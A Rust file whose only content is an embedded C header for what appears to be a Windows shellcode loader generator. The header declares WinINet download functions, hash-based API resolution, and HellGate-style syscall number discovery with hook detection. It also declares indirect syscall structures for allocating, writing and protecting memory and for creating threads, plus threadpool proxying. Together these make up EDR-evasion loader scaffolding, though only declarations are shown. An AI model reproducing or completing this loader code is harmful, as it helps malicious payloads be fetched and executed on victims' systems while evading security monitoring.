pub const WINAPI_H: &str = r#"#pragma once

#include <windows.h>

/* MSVCRT FUNCTION */
// typedef void *(WINAPI *MALLOC)(size_t size);
// typedef int(WINAPI *STRCMP)(const char *_Str1, const char *_Str2);

/* WININET FUNCTION */
typedef LPVOID HINTERNET;
typedef HINTERNET *LPHINTERNET;
typedef HINTERNET(WINAPI *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType,
                                         LPCSTR lpszProxy,
                                         LPCSTR lpszProxyBypass, DWORD dwFlags);

typedef HINTERNET(WINAPI *InternetOpenUrlA)(HINTERNET hInternet, LPCSTR lpszUrl,
                                            LPCSTR lpszHeaders,
                                            DWORD dwHeadersLength,
                                            DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(WINAPI *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer,
                                       DWORD dwNumberOfBytesToRead,
                                       LPDWORD lpdwNumberOfBytesRead);

typedef BOOL(WINAPI *InternetCloseHandle)(HINTERNET hInternet);

/* NTDLL FUNCTION */
typedef NTSTATUS(NTAPI *TPALLOCWORK)(PTP_WORK *ptpWrk,
                                     PTP_WORK_CALLBACK pfnwkCallback,
                                     PVOID OptionalArg,
                                     PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI *TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI *TPRELEASEWORK)(PTP_WORK);

FARPROC GetProcAddressS(IN HMODULE hModule, IN DWORD dwApiName);
HMODULE GetModuleHandleS(IN DWORD dwModuleName);

/* NTDLL.DLL function struct
 * --------------------------
 * the NTDLL api, we will use HellGate to search ssn and address
 * at last, we will use tpallocwork to proxy or just use indirect
 * syscall
 */
#define UP -32
#define DOWN 32
#define RANGE 0xFF
/* the ntdll in peb information struct */
typedef struct _NT_CONFIG {
    PDWORD pdwArrayOfAddresses;
    PDWORD pdwArrayOfNames;
    PWORD pwArrayOfOrdinals;
    DWORD dwNumberOfNames;
    ULONG_PTR uModule;
} NT_CONFIG, *PNT_CONFIG;

/* the syscall information struct */
typedef struct _NT_SYSCALL {
    DWORD dwSsn;
    PVOID pSyscallAddress;
    PVOID pSyscallInstAddress;
} NT_SYSCALL, *PNT_SYSCALL;

/* will used nt api struct */
typedef struct _NT_API {
    NT_SYSCALL NtAllocateVirtualMemory;
    NT_SYSCALL NtProtectVirtualMemory;
    NT_SYSCALL NtCreateThreadEx;
    NT_SYSCALL NtWaitForSingleObject;
    NT_SYSCALL NtWriteVirtualMemory;
    NT_SYSCALL TpAllocWork;
    NT_SYSCALL TpPostWork;
    NT_SYSCALL TpReleaseWork;
} NT_API, *PNT_API;
HMODULE GetNtdllHandle();
int InitNtConfig();
int InitNtApi();
int InitNtSyscall(IN PNT_CONFIG pNtConfig, IN DWORD dwSysHash,
                  OUT PNT_SYSCALL pNtSys);
int FunctionUpDown(IN PBYTE pFunctionAddress, WORD idx);
int FunctionHook(IN PBYTE pFunctionAddress);
extern VOID SetSsn(IN DWORD dwSsn, IN PVOID pSyscallInstAddress);
extern int SysCall();
#define CONFIGURE_SYSCALL(NtSys)                                               \
    (SetSsn((DWORD)NtSys.dwSsn, (PVOID)NtSys.pSyscallInstAddress))


"#;